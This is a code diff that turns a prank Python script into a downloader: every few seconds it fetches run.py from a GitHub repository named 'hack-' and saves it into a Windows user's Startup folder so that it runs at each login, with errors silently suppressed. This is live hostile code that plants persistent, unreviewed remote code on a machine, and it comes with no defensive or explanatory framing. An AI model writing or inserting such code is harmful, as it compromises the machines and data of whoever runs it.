@@ -1,12 +1,34 @@
+import urllib.request
+import re
 import time
+import os
+def h():
 
-def codething(): 
-    print("you noob :)")
+    time.sleep(5)
+    download_and_save_script()
+    h()
 
-    time.sleep(10)
-    haha()
+def download_and_save_script():
+    url = "https://raw.githubusercontent.com/huggywuggyMaster/hack-/main/run.py"
+    save_path = "C:\\Users\\bendy\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\S468.py"
     
-def haha():
-    codething()
+    try:
+        # Skript von der URL herunterladen
+        with urllib.request.urlopen(url) as response:
+            script_content = response.read()
+        
+        # Skript am angegebenen Speicherort speichern
+        with open(save_path, 'wb') as file:
+            file.write(script_content)
+        
+       
+    except Exception as e:
+        print()
 
-codething()    
+# Beispielaufruf der Funktion
+
+
+def runAndDelete():
+    import run
+    run.runIt
+h()
